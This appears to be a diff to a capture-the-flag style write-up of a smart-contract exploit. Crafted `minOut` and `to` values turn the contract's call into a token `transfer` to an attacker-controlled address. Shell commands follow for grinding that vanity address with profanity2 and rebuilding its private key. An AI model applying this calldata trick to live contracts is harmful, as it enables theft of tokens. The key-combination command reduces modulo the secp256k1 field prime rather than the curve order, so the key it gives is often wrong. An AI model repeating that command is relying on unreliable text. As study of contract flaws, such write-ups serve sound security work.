@@ -59,4 +59,45 @@ We can control minOut and tokenAmount, and `to` should be set as the contract's 
 - The next 32 bytes is an address that we have control over.
 - The following 32 bytes represent the value, which we’ll set to a large number.
 
-So we can set the first 4 bytes of `minOut` are to be `0xa9059cbb` which is the function selector of `transfer(address,uint256)`. And the last 16 bytes plus the first 4 bytes of `to` should be an address that we have control over. We can use tools like [Profanity2](https://github.com/1inch/profanity2) to generate the address with given suffix. And the last 16 bytes of `to` will be interpreted as the amount to transfer, so can set `tokenAmount` = 0 to let the contract transfer a large amount of Doju token out.
+So we can set the first 4 bytes of `minOut` are to be `0xa9059cbb` which is the function selector of `transfer(address,uint256)`. And the last 16 bytes plus the first 4 bytes of `to` should be an address that we have control over. We can use tools like [Profanity2](https://github.com/1inch/profanity2) to generate the address with given suffix. And the last 16 bytes of `to` will be interpreted as the amount to transfer, so can set `tokenAmount` = 0 to let the contract transfer a large amount of Doju token out.  
+
+We need to generate a Public key used for profanity2: 
+
+```shell
+openssl ecparam -genkey -name secp256k1 -text -noout -outform DER | xxd -p -c 1000 | sed 's/41534e31204f49443a20736563703235366b310a30740201010420/Private Key: /' | sed 's/a00706052b8104000aa144034200/\'$'\nPublic Key: /'
+```
+
+Or Import from existing one Private key: 
+
+```shell
+openssl ec -inform DER -text -noout -in <(cat <(echo -n "302e0201010420") <(echo -n "PRIVATE_KEY_HEX") <(echo -n "a00706052b8104000a") | xxd -r -p) 2>/dev/null | tail -6 | head -5 | sed 's/[ :]//g' | tr -d '\n' && echo
+```
+
+Now all we need is to generate a vanity address ends with specific with public key(without 04 prefix) as a parameter.
+
+Here is how we use profanity2 to generate the address ends with `0xc47FCc04` 
+
+```shell
+./profanity2.x64 -z [Public Key Without 04 prefix] --matching XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXc47FCc04
+```
+
+We can get a private key B from the output then we need to calcuate the real private key from a combination calculation of private key we generate using `openssl` and private key from the profanity: 
+
+```shell 
+Time:    34s Score:  4 Private: {PRIVATE_KEY_FROM_PROFANITY2} Address: 0xfb58d679d717ace20623ae0738ad2680c47fcc04
+```
+
+```shell
+(echo 'ibase=16;obase=10' && (echo '(Private key from openssl + Private key from profanity2(with out 0x prefix)) % FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F' | tr '[:lower:]' '[:upper:]')) | bc
+```
+
+
+Then we could get the real private key and we could verify it using `cast`
+
+```shell
+cast wallet address [private key from calculation]
+```
+
+
+
+                                 
